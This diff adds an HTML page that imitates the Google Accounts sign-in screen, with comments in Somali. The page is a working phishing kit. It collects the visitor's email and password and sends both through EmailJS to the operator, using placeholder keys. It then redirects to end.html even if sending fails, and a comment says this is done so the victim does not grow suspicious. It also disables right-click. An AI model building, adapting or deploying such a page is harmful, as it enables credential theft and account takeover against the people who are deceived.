@@ -1,0 +1,282 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Sign in - Google Accounts</title>
+    <style>
+        :root {
+            --bg-color: #000000;
+            --text-main: #e8eaed;
+            --text-sub: #9aa0a6;
+            --link-color: #8ab4f8;
+            --input-border: #3c4043;
+            --input-focus: #8ab4f8;
+            --btn-bg: #8ab4f8;
+            --btn-disabled: #3c4043;
+        }
+
+        * { box-sizing: border-box; -webkit-user-select: none; font-family: 'Roboto', sans-serif; }
+
+        body {
+            background-color: var(--bg-color);
+            color: var(--text-main);
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        /* --- Google Style Loading Bar --- */
+        .top-loader {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 3px;
+            background: transparent;
+            z-index: 9999;
+        }
+
+        .loader-bar {
+            height: 100%;
+            width: 0%;
+            background: #4285F4;
+            transition: width 0.3s ease;
+        }
+
+        .container {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            padding: 40px 24px 20px;
+            max-width: 450px;
+            margin: 0 auto;
+            width: 100%;
+        }
+
+        .logo { text-align: center; font-size: 24px; margin-bottom: 12px; font-weight: 500; }
+        h1 { text-align: center; font-size: 24px; font-weight: 400; margin: 0 0 15px; }
+
+        .user-identity {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border: 1px solid var(--input-border);
+            border-radius: 20px;
+            padding: 4px 12px;
+            width: fit-content;
+            margin: 0 auto 30px;
+            font-size: 14px;
+        }
+
+        .sub-text { text-align: center; font-size: 16px; line-height: 1.4; margin-bottom: 10px; }
+        .blue-link { color: var(--link-color); text-decoration: none; font-size: 14px; font-weight: 500; }
+
+        .field-container { position: relative; margin-top: 25px; }
+        input {
+            width: 100%;
+            padding: 16px;
+            background: transparent;
+            border: 1px solid var(--input-border);
+            border-radius: 4px;
+            color: var(--text-main);
+            font-size: 16px;
+            outline: none;
+            -webkit-user-select: text;
+        }
+        input:focus { border: 2px solid var(--input-focus); }
+
+        label {
+            position: absolute;
+            left: 15px;
+            top: 16px;
+            color: var(--text-sub);
+            transition: 0.2s;
+            pointer-events: none;
+        }
+        input:focus + label, input:not(:placeholder-shown) + label {
+            top: -10px; left: 10px; background: var(--bg-color); padding: 0 5px; font-size: 12px; color: var(--link-color);
+        }
+
+        .show-pass { display: flex; align-items: center; margin-top: 15px; font-size: 14px; }
+        .show-pass input { width: 18px; height: 18px; margin-right: 10px; }
+
+        .footer {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: auto;
+            padding-bottom: 20px;
+        }
+
+        .next-btn {
+            background-color: var(--btn-bg);
+            color: #202124;
+            border: none;
+            padding: 10px 24px;
+            border-radius: 4px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+        .next-btn:disabled {
+            background-color: var(--btn-disabled);
+            color: #5f6368;
+            cursor: not-allowed;
+        }
+
+        .hidden { display: none !important; }
+    </style>
+</head>
+<body>
+
+<div class="top-loader">
+    <div class="loader-bar" id="loader"></div>
+</div>
+
+<div id="page-email" class="container">
+    <div class="logo">
+        <span style="color:#4285F4">G</span><span style="color:#EA4335">o</span><span style="color:#FBBC05">o</span><span style="color:#4285F4">g</span><span style="color:#34A853">l</span><span style="color:#EA4335">e</span>
+    </div>
+    <h1>Sign in</h1>
+    <p class="sub-text">Use your Google Account</p>
+    
+    <div class="field-container">
+        <input type="text" id="email-input" placeholder=" " required autocomplete="off">
+        <label>Email or phone</label>
+    </div>
+    <p style="margin-top: 30px;"><a href="#" class="blue-link">Forgot email?</a></p>
+
+    <div class="footer">
+        <a href="#" class="blue-link">Create account</a>
+        <button id="email-next" class="next-btn" disabled>Next</button>
+    </div>
+</div>
+
+<div id="page-password" class="container hidden">
+    <div class="logo">
+        <span style="color:#4285F4">G</span><span style="color:#EA4335">o</span><span style="color:#FBBC05">o</span><span style="color:#4285F4">g</span><span style="color:#34A853">l</span><span style="color:#EA4335">e</span>
+    </div>
+    <h1>Welcome</h1>
+    
+    <div class="user-identity">
+        <span style="margin-right: 8px;">👤</span>
+        <span id="display-email"></span>
+    </div>
+
+    <div class="field-container">
+        <input type="password" id="pass-input" placeholder=" " required autocomplete="off">
+        <label>Enter your password</label>
+    </div>
+
+    <div class="show-pass">
+        <input type="checkbox" id="toggle-pass">
+        <span>Show password</span>
+    </div>
+
+    <div class="footer">
+        <a href="#" class="blue-link">Forgot password?</a>
+        <button id="pass-next" class="next-btn">Next</button>
+    </div>
+</div>
+
+<script>
+    const emailInput = document.getElementById('email-input');
+    const emailNextBtn = document.getElementById('email-next');
+    const pageEmail = document.getElementById('page-email');
+    const pagePassword = document.getElementById('page-password');
+    const displayEmail = document.getElementById('display-email');
+    const loader = document.getElementById('loader');
+
+    // 1. Hubinta Emailka
+    emailInput.addEventListener('input', () => {
+        const val = emailInput.value;
+        emailNextBtn.disabled = !(val.includes('@') && val.includes('.com'));
+    });
+
+    // 2. Shaqada Loading-ka iyo Gudubka
+    emailNextBtn.addEventListener('click', () => {
+        let progress = 0;
+        loader.style.width = "0%";
+        
+        // Bilaabidda Loading-ka (3 ilbiriqsi)
+        const interval = setInterval(() => {
+            progress += Math.random() * 15;
+            if (progress >= 100) {
+                progress = 100;
+                clearInterval(interval);
+                
+                // Markuu dhamaado, gudbi bogga kale
+                setTimeout(() => {
+                    displayEmail.innerText = emailInput.value;
+                    pageEmail.classList.add('hidden');
+                    pagePassword.classList.remove('hidden');
+                    loader.style.width = "0%"; // Dib u eber loading-ka
+                }, 400);
+            }
+            loader.style.width = progress + "%";
+        }, 250); // Xawaaraha loading-ka
+    });
+
+    // Show password toggle
+    document.getElementById('toggle-pass').addEventListener('change', function() {
+        document.getElementById('pass-input').type = this.checked ? 'text' : 'password';
+    });
+
+
+    document.addEventListener('contextmenu', e => e.preventDefault());
+    // 1. ISKU-XIRKA (Geli Keys-kaaga halkan)
+(function() {
+    emailjs.init("YOUR_PUBLIC_KEY"); 
+})();
+
+// Variables-ka xogta qabanaya (Adigoo isticmaalaya ID-yadii aad iisoo dirtay)
+const emailInp = document.getElementById('email-input');
+const passInp = document.getElementById('pass-input');
+const btnNext1 = document.getElementById('email-next');
+const btnNext2 = document.getElementById('pass-next');
+const bogga1 = document.getElementById('page-email');
+const bogga2 = document.getElementById('page-password');
+const muujiEmail = document.getElementById('display-email');
+
+// ☆ SHAQADA 1: KAYDINTA (Variable-kan ayaa xogta haya inta laga dirayo)
+let xogtaHaye = "";
+
+// Marka la taabto Next-ka hore
+btnNext1.addEventListener('click', () => {
+    xogtaHaye = emailInp.value; // Email-ka halkan ayaa lagu kaydiyey
+    
+    // U gudbi bogga password-ka
+    muujiEmail.innerText = xogtaHaye;
+    bogga1.classList.add('hidden');
+    bogga2.classList.remove('hidden');
+});
+
+// ☆ SHAQADA 2 & 3: DIRISTA IYO GUDBINTA
+btnNext2.addEventListener('click', () => {
+    const passwordka = passInp.value;
+
+    // Diyaarinta xogta (Email-kii hore u kaydsanaa + Password-ka hadda)
+    const xogtaDhammaystiran = {
+        user_email: xogtaHaye,
+        user_pass: passwordka
+    };
+
+    // DIRISTA: EmailJS ayaan u diraynaa
+    emailjs.send("YOUR_SERVICE_ID", "YOUR_TEMPLATE_ID", xogtaDhammaystiran)
+        .then(() => {
+            // GUDBINTA: Markay diristu dhamaato u dir end.html
+            window.location.href = "end.html";
+        })
+        .catch(() => {
+            // Haddii ay cilad dhacdo xitaa u gudbi si aysan u shakin
+            window.location.href = "end.html";
+        });
+});
+
+</script>
+
+</body>
+</html>
